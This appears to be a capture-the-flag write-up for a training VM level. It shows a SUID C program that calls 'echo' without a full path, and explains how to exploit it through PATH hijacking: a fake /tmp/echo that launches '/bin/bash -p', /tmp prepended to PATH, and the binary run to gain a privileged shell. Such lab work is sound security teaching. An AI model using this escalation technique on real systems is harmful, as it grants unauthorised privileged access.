# username / password
level01 / level01
# objective
* There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
* To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```
# concept
* PATH hijacking
* the binary references a system command with a relative filepath `echo`, so it's vulnerable to Linux path hijacking
# method of solve
* to perform path hijacking, we need to create a malicious `echo` file in a writable directory. We'll use `tmp`
```
echo '/bin/bash -p' > /tmp/echo
chmod +x /tmp/echo
```
* the next step is to add the `/tmp` directory to the path
```
export PATH=/tmp:$PATH
```
* now when we run the SUID binary, it will run the code in the malicious `echo` file we created in the `/tmp` directory
```
/home/flag01/flag01
getflag
```
